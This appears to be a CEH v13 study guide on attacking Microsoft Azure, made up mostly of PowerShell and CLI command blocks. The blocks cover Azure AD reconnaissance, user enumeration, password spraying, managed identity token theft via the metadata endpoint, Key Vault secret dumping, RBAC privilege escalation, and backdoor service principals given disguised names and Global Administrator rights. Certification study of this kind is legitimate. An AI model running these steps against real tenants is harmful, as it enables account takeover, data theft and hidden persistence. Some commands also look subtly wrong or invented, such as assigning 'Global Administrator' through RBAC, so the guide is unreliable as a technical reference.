# Microsoft Azure Hacking Demonstrations - CEH v13

## Azure Reconnaissance Using AADInternals

### AADInternals Overview
- **Purpose**: PowerShell module for Azure Active Directory security assessment
- **Capabilities**: Reconnaissance, enumeration, exploitation of AAD environments
- **Features**: Token manipulation, user enumeration, device registration
- **Installation**: PowerShell Gallery module for Windows and PowerShell Core

### AADInternals Installation and Setup
```powershell
# Install AADInternals
Install-Module AADInternals

# Import the module
Import-Module AADInternals

# Get module information
Get-Command -Module AADInternals
```

### Basic Azure AD Reconnaissance
```powershell
# Check if domain is managed by Azure AD
Get-AADIntLoginInformation -Domain target.com

# Get tenant information
Get-AADIntTenantDetails -Domain target.com

# Enumerate desktop SSO settings
Get-AADIntDesktopSSO -Domain target.com

# Check federation settings
Get-AADIntDomainAuthenticationSettings -Domain target.com
```

### Advanced Reconnaissance Techniques
- **Tenant Discovery**: Identify Azure AD tenant information
- **Domain Federation**: Check if domain uses federated authentication
- **OpenID Configuration**: Extract OpenID Connect configuration
- **Desktop SSO**: Identify desktop single sign-on configurations

### Information Gathering Categories
- **Tenant Information**: Tenant ID, domain verification status
- **Authentication Methods**: Password sync, federation, pass-through auth
- **Service Endpoints**: Authentication and token endpoints
- **Security Settings**: MFA requirements, conditional access policies

## Identifying Azure Services and Resources

### Azure Service Discovery Methods
- **DNS Enumeration**: Discover Azure services through DNS records
- **Subdomain Analysis**: Find Azure-hosted services and applications
- **Certificate Transparency**: Search CT logs for Azure certificates
- **Port Scanning**: Identify exposed Azure services

### Common Azure Service Patterns
```bash
# Azure Web Apps
target.azurewebsites.net
target-staging.azurewebsites.net

# Azure Storage Accounts
targetstg.blob.core.windows.net
targetstg.file.core.windows.net
targetstg.queue.core.windows.net
targetstg.table.core.windows.net

# Azure Databases
target.database.windows.net
target.mysql.database.azure.com
target.postgres.database.azure.com

# Azure Key Vault
target.vault.azure.net

# Azure Container Registry
target.azurecr.io
```

### Resource Enumeration Tools
```bash
# MicroBurst - Azure security assessment toolkit
Import-Module MicroBurst
Invoke-EnumerateAzureBlobs -Base company
Invoke-EnumerateAzureSubDomains -Base company

# Azure CLI reconnaissance
az account list
az resource list
az webapp list
az storage account list
```

### Service-Specific Discovery
- **Web Applications**: Azure App Service applications
- **Storage Accounts**: Blob, table, queue, and file storage
- **Databases**: SQL Database, MySQL, PostgreSQL instances
- **Key Vaults**: Secret management services
- **Container Services**: AKS clusters, container registries

## Enumerating Azure Active Directory Accounts

### User Enumeration Techniques
```powershell
# Using AADInternals for user enumeration
Get-AADIntUsers -Domain target.com

# Enumerate users via login attempts
Invoke-AADIntUserEnumerationAsOutsider -UserName user@target.com

# Password spray attack
Invoke-AADIntPasswordSprayAsOutsider -DomainName target.com -UserNames users.txt -Password "Password123"

# Check user existence
Test-AADIntUserExistence -User user@target.com
```

### Azure AD Connect Enumeration
```powershell
# Get Azure AD Connect information
Get-AADIntSyncConfiguration

# Enumerate sync accounts
Get-AADIntSyncCredentials

# Check hybrid configuration
Get-AADIntAzureADConnectConfiguration
```

### Group and Role Enumeration
- **Administrative Groups**: Global admins, privileged role administrators
- **Service Principals**: Application identities and service accounts
- **Guest Users**: External users with access to tenant
- **Conditional Access**: Policies affecting user access

### Advanced Enumeration Methods
```powershell
# Enumerate applications
Get-AADIntApplications

# Get service principals
Get-AADIntServicePrincipals

# Enumerate devices
Get-AADIntDevices

# Check tenant policies
Get-AADIntTenantPolicies
```

## Identifying Attack Surface Using StormSpotter

### StormSpotter Overview
- **Purpose**: Azure Red Team tool for attack path analysis
- **Visualization**: Neo4j graph database for relationship mapping
- **Analysis**: Identify privilege escalation and lateral movement paths
- **Multi-Tenant**: Support for multiple Azure subscriptions

### StormSpotter Installation
```bash
# Clone StormSpotter repository
git clone https://github.com/Azure/Stormspotter.git
cd Stormspotter

# Install dependencies
pip install -r requirements.txt

# Setup Neo4j database
docker run -p 7474:7474 -p 7687:7687 -e NEO4J_AUTH=neo4j/password neo4j
```

### Data Collection with StormSpotter
```bash
# Authenticate to Azure
az login

# Run data collection
python stormcollector.py --tenant-id <tenant-id> --subscription-id <subscription-id>

# Import data to Neo4j
python stormimporter.py --neo4j-uri bolt://localhost:7687 --neo4j-user neo4j --neo4j-password password
```

### Attack Surface Analysis
- **Resource Relationships**: Connections between Azure resources
- **Permission Mappings**: User and service principal permissions
- **Network Topology**: Virtual network connections and security groups
- **Identity Relationships**: User, group, and application relationships

### Key Attack Paths
- **Privilege Escalation**: Paths to elevated permissions
- **Lateral Movement**: Movement between resources and subscriptions
- **Data Access**: Paths to sensitive data and storage
- **Network Traversal**: Network-based attack opportunities

## Collecting Data from Azure AD and Azure RM Using AzureHound

### AzureHound Overview
- **Purpose**: Azure data collection tool for BloodHound analysis
- **Integration**: Works with BloodHound for graph-based analysis
- **Coverage**: Azure AD and Azure Resource Manager data
- **Output**: JSON files compatible with BloodHound ingestion

### AzureHound Installation and Usage
```bash
# Download AzureHound
wget https://github.com/BloodHoundAD/AzureHound/releases/latest/download/azurehound-linux-amd64.zip
unzip azurehound-linux-amd64.zip

# Authenticate to Azure
az login

# Run AzureHound collection
./azurehound-linux-amd64 -t <tenant-id>

# Specify output directory
./azurehound-linux-amd64 -t <tenant-id> -o /path/to/output
```

### Data Collection Categories
- **Users and Groups**: Azure AD user and group information
- **Service Principals**: Application and managed identity details
- **Role Assignments**: RBAC role assignments and permissions
- **Resources**: Azure resources and their relationships
- **Subscriptions**: Subscription-level permissions and access

### BloodHound Integration
```bash
# Import AzureHound data into BloodHound
# Copy JSON files to BloodHound import directory
cp *.json /path/to/bloodhound/import/

# Use BloodHound GUI to import and analyze data
```

### Analysis Queries
- **Azure Admin Paths**: Paths to Azure administrative roles
- **Subscription Owners**: Users with subscription-level access
- **Cross-Tenant Access**: External users with tenant access
- **Service Principal Abuse**: Overprivileged service principals

## Accessing Publicly Exposed Blob Storage Using GoBlob

### GoBlob Tool Overview
- **Purpose**: Enumerate and access Azure Blob Storage containers
- **Features**: Container discovery, permission testing, content enumeration
- **Automation**: Bulk scanning and analysis capabilities
- **Detection**: Publicly accessible blob containers

### GoBlob Installation and Usage
```bash
# Install GoBlob
go get -u github.com/Tensai75/goblob

# Basic container enumeration
goblob -d target.com

# Specific storage account testing
goblob -s targetstg

# Wordlist-based enumeration
goblob -d target.com -w container-wordlist.txt

# Output results to file
goblob -d target.com -o results.txt
```

### Blob Storage Discovery Methods
- **DNS Enumeration**: Find storage accounts through DNS
- **Subdomain Brute Force**: Guess storage account names
- **Certificate Analysis**: Extract storage endpoints from certificates
- **Application Analysis**: Find storage references in applications

### Container Permission Testing
```bash
# Test container permissions
goblob -s storageaccount -c containername --test-permissions

# Download accessible blobs
goblob -s storageaccount -c containername --download

# List blob contents
goblob -s storageaccount -c containername --list
```

### Common Blob Container Names
- **Backups**: backup, backups, bak, archive
- **Logs**: logs, logging, log-files, audit
- **Data**: data, files, documents, uploads
- **Configuration**: config, configuration, settings
- **Public**: public, www, web, assets, images

## Identifying Open Network Security Groups in Azure

### Network Security Group Analysis
- **Purpose**: Identify overly permissive NSG rules
- **Risk Assessment**: Evaluate network exposure and attack surface
- **Compliance**: Check against security baselines and standards
- **Automation**: Automated NSG rule analysis

### Azure CLI NSG Enumeration
```bash
# List all network security groups
az network nsg list

# Get NSG rules for specific group
az network nsg rule list --resource-group rg-name --nsg-name nsg-name

# Find NSGs with rules allowing internet access
az network nsg list --query "[].{Name:name, ResourceGroup:resourceGroup}" -o table

# Check for rules allowing any source (0.0.0.0/0)
az network nsg rule list --resource-group rg-name --nsg-name nsg-name --query "[?sourceAddressPrefix=='*' || sourceAddressPrefix=='0.0.0.0/0']"
```

### PowerShell NSG Analysis
```powershell
# Connect to Azure
Connect-AzAccount

# Get all NSGs in subscription
Get-AzNetworkSecurityGroup

# Analyze NSG rules for open access
$nsg = Get-AzNetworkSecurityGroup -ResourceGroupName "rg-name" -Name "nsg-name"
$nsg.SecurityRules | Where-Object {$_.SourceAddressPrefix -eq "*" -or $_.SourceAddressPrefix -eq "0.0.0.0/0"}

# Check for common dangerous ports
$dangerousPorts = @("22", "3389", "1433", "3306", "5432")
$nsg.SecurityRules | Where-Object {$_.DestinationPortRange -in $dangerousPorts -and $_.Access -eq "Allow"}
```

### Critical NSG Misconfigurations
- **Any Source (0.0.0.0/0)**: Rules allowing access from any internet source
- **Management Ports**: SSH (22), RDP (3389) exposed to internet
- **Database Ports**: SQL (1433), MySQL (3306), PostgreSQL (5432) exposed
- **Wide Port Ranges**: Rules allowing large port ranges
- **Default Rules**: Unchanged default NSG configurations

### NSG Assessment Tools
```bash
# MicroBurst NSG analysis
Import-Module MicroBurst
Get-AzureRMNetworkSecurityGroups

# Custom PowerShell script for NSG analysis
Get-AzNetworkSecurityGroup | ForEach-Object {
    $_.SecurityRules | Where-Object {
        $_.SourceAddressPrefix -eq "*" -and $_.Access -eq "Allow"
    } | Select-Object Name, Priority, Direction, Access, Protocol, SourceAddressPrefix, DestinationPortRange
}
```

## Exploiting Managed Identities and Azure Functions

### Managed Identity Exploitation
- **System-Assigned**: Identities tied to specific Azure resources
- **User-Assigned**: Standalone identities that can be assigned to multiple resources
- **Token Access**: Accessing Azure Resource Manager using managed identity tokens
- **Privilege Escalation**: Leveraging managed identity permissions

### Azure Function Exploitation
```bash
# Enumerate Azure Functions
az functionapp list

# Get function details
az functionapp show --name function-name --resource-group rg-name

# Access function endpoints
curl https://function-name.azurewebsites.net/api/function-endpoint

# Extract function code (if accessible)
az functionapp deployment source show --name function-name --resource-group rg-name
```

### Managed Identity Token Extraction
```bash
# From Azure VM or function (IMDS)
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Using Azure CLI
az account get-access-token --resource https://management.azure.com/

# PowerShell method
$response = Invoke-RestMethod -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -Method GET -Headers @{Metadata="true"}
```

### Token Utilization
```bash
# Use extracted token for API calls
curl -H "Authorization: Bearer $TOKEN" https://management.azure.com/subscriptions?api-version=2020-01-01

# Access Key Vault with managed identity
curl -H "Authorization: Bearer $TOKEN" https://vault-name.vault.azure.net/secrets/secret-name?api-version=2016-10-01
```

### Function App Security Issues
- **Anonymous Access**: Functions accessible without authentication
- **Overprivileged MSI**: Managed identities with excessive permissions
- **Code Injection**: Input validation vulnerabilities in function code
- **Secret Exposure**: Hardcoded secrets in function configurations

## Privilege Escalation Using Misconfigured User Accounts in Azure

### Common Privilege Escalation Vectors
- **Role Assignment Permissions**: Users who can assign roles to themselves
- **Key Vault Access**: Access to secrets containing privileged credentials
- **Automation Account**: RunAs accounts with elevated permissions
- **Service Principal Abuse**: Leveraging service principal credentials

### Azure RBAC Privilege Escalation
```powershell
# Check current user permissions
Get-AzRoleAssignment -SignInName user@domain.com

# Attempt to assign Global Administrator role
New-AzRoleAssignment -SignInName user@domain.com -RoleDefinitionName "Global Administrator"

# Create custom role with excessive permissions
$role = [Microsoft.Azure.Commands.Resources.Models.Authorization.PSRoleDefinition]::new()
$role.Name = "Custom Admin Role"
$role.Actions.Add("*")
New-AzRoleDefinition -Role $role
```

### Key Vault Privilege Escalation
```bash
# List accessible key vaults
az keyvault list

# Access secrets from key vault
az keyvault secret show --name secret-name --vault-name vault-name

# List all secrets in vault
az keyvault secret list --vault-name vault-name

# Download certificate with private key
az keyvault certificate download --name cert-name --vault-name vault-name --file cert.pfx
```

### Automation Account Exploitation
```powershell
# Enumerate automation accounts
Get-AzAutomationAccount

# Get RunAs account certificate
Get-AzAutomationCertificate -AutomationAccountName automation-account -ResourceGroupName rg-name

# Execute runbook with elevated permissions
Start-AzAutomationRunbook -AutomationAccountName automation-account -Name runbook-name -ResourceGroupName rg-name
```

### Service Principal Credential Abuse
```bash
# Use service principal credentials
az login --service-principal -u app-id -p password --tenant tenant-id

# Check service principal permissions
az role assignment list --assignee app-id

# Access resources with service principal
az resource list
az storage account list
```

## Creating Persistent Backdoors in Azure AD Using Service Principals

### Service Principal Backdoor Techniques
- **Application Registration**: Register new applications with backdoor access
- **Certificate-Based Authentication**: Use certificates for persistent access
- **Client Secret Generation**: Create long-lived client secrets
- **Permission Manipulation**: Grant excessive permissions to service principals

### Creating Backdoor Application
```powershell
# Register new application
$app = New-AzADApplication -DisplayName "System Backup Service"

# Create service principal
$sp = New-AzADServicePrincipal -ApplicationId $app.ApplicationId

# Generate client secret
$secret = New-AzADAppCredential -ApplicationId $app.ApplicationId -EndDate (Get-Date).AddYears(2)

# Assign Global Administrator role
New-AzRoleAssignment -ObjectId $sp.Id -RoleDefinitionName "Global Administrator"
```

### Certificate-Based Backdoor
```powershell
# Generate self-signed certificate
$cert = New-SelfSignedCertificate -Subject "CN=BackdoorCert" -CertStoreLocation "Cert:\CurrentUser\My" -NotAfter (Get-Date).AddYears(2)

# Create application with certificate
$app = New-AzADApplication -DisplayName "Certificate Service"
New-AzADAppCredential -ApplicationId $app.ApplicationId -CertValue ([Convert]::ToBase64String($cert.RawData))

# Create service principal and assign permissions
$sp = New-AzADServicePrincipal -ApplicationId $app.ApplicationId
New-AzRoleAssignment -ObjectId $sp.Id -RoleDefinitionName "Contributor"
```

### Maintaining Access Techniques
- **Multiple Credentials**: Create multiple authentication methods
- **Hidden Applications**: Use non-obvious application names
- **Distributed Permissions**: Spread permissions across multiple principals
- **Dormant Principals**: Create principals that activate later

### Backdoor Persistence Verification
```bash
# Test service principal authentication
az login --service-principal -u app-id -p client-secret --tenant tenant-id

# Verify permissions
az role assignment list --assignee app-id

# Test resource access
az resource list
az keyvault list
```

## Exploiting VNet Peering Connections

### VNet Peering Reconnaissance
- **Peering Discovery**: Identify VNet peering relationships
- **Network Topology**: Map connected virtual networks
- **Route Analysis**: Understand traffic flow between networks
- **Security Assessment**: Identify security gaps in peering

### VNet Peering Enumeration
```bash
# List virtual networks
az network vnet list

# Get VNet peering information
az network vnet peering list --vnet-name vnet-name --resource-group rg-name

# Show peering details
az network vnet peering show --name peering-name --vnet-name vnet-name --resource-group rg-name

# Check effective routes
az network nic show-effective-route-table --name nic-name --resource-group rg-name
```

### PowerShell VNet Analysis
```powershell
# Get all VNets and their peerings
Get-AzVirtualNetwork | ForEach-Object {
    $vnet = $_
    $vnet.VirtualNetworkPeerings | ForEach-Object {
        [PSCustomObject]@{
            VNetName = $vnet.Name
            PeeringName = $_.Name
            RemoteVirtualNetwork = $_.RemoteVirtualNetwork.Id
            PeeringState = $_.PeeringState
            AllowVirtualNetworkAccess = $_.AllowVirtualNetworkAccess
            AllowForwardedTraffic = $_.AllowForwardedTraffic
            AllowGatewayTransit = $_.AllowGatewayTransit
        }
    }
}
```

### Peering Exploitation Techniques
- **Lateral Movement**: Move between peered networks
- **Network Reconnaissance**: Scan peered network segments
- **Traffic Interception**: Intercept traffic between peered networks
- **Security Bypass**: Bypass network security controls through peering

### VNet Peering Security Issues
- **Overpermissive Peering**: Peerings allowing unnecessary traffic
- **Transitive Routing**: Unintended connectivity through multiple peerings
- **Gateway Transit**: Misuse of gateway transit permissions
- **Network Security Group Bypass**: Traffic bypassing NSG rules

## Azure Training Infrastructure

### AzureGoat - Vulnerable by Design Azure Infrastructure

#### AzureGoat Overview
- **Purpose**: Intentionally vulnerable Azure infrastructure for learning
- **Components**: Multiple vulnerable Azure services and configurations
- **Scenarios**: Real-world attack scenarios and misconfigurations
- **Learning**: Hands-on practice with Azure security testing

#### AzureGoat Components
- **Vulnerable Web Apps**: Applications with security flaws
- **Misconfigured Storage**: Publicly accessible storage accounts
- **Weak IAM**: Overprivileged users and service principals
- **Network Issues**: Open NSGs and insecure network configurations
- **Function Vulnerabilities**: Insecure Azure Functions

#### AzureGoat Deployment
```bash
# Clone AzureGoat repository
git clone https://github.com/ine-labs/AzureGoat.git
cd AzureGoat

# Login to Azure
az login

# Deploy vulnerable infrastructure
./deploy.sh

# Access training scenarios
cat README.md
ls scenarios/
```

#### Training Scenarios
- **Blob Storage Exploitation**: Practice storage security testing
- **Function App Security**: Serverless security assessment
- **Network Security Testing**: VNet and NSG exploitation
- **Identity and Access**: Azure AD security testing
- **Privilege Escalation**: Azure RBAC exploitation scenarios

#### Learning Objectives
- **Reconnaissance**: Azure service discovery and enumeration
- **Exploitation**: Vulnerability identification and exploitation
- **Privilege Escalation**: Azure-specific privilege escalation techniques
- **Persistence**: Backdoor creation and maintenance in Azure
- **Network Security**: Azure networking security assessment

---

## Key CEH v13 Exam Points

### Critical Concepts
1. **AADInternals**: Master Azure AD reconnaissance and exploitation techniques
2. **Service Discovery**: Understand Azure service enumeration and identification
3. **Managed Identities**: Know how to exploit managed identity tokens and permissions
4. **Network Security**: Analyze NSGs and VNet peering security implications
5. **Privilege Escalation**: Various Azure RBAC and identity-based escalation methods
6. **Persistence Mechanisms**: Service principal backdoors and persistent access methods
7. **Assessment Tools**: Proficiency with StormSpotter, AzureHound, and specialized Azure tools

### Exam Focus Areas
* **Azure AD Enumeration**: User enumeration, password spraying, and tenant discovery
* **Blob Storage Security**: GoBlob usage for container discovery and exploitation
* **Network Security Groups**: Identifying overpermissive NSG rules and network exposure
* **Managed Identity Exploitation**: IMDS attacks and token utilization in Azure
* **Service Principal Abuse**: Creating backdoors and maintaining persistence
* **VNet Security**: Peering exploitation and network lateral movement
* **Azure Tools**: AADInternals, MicroBurst, StormSpotter for comprehensive assessment

### Practical Skills
* Perform comprehensive Azure reconnaissance using AADInternals and related tools
* Identify and exploit Azure Blob Storage misconfigurations
* Analyze Azure network security groups for overpermissive rules
* Extract and utilize managed identity tokens for privilege escalation
* Create persistent backdoors using Azure service principals
* Exploit VNet peering relationships for lateral movement
* Use specialized tools like StormSpotter and AzureHound for attack path analysis
* Understand Azure-specific attack vectors and defensive considerations
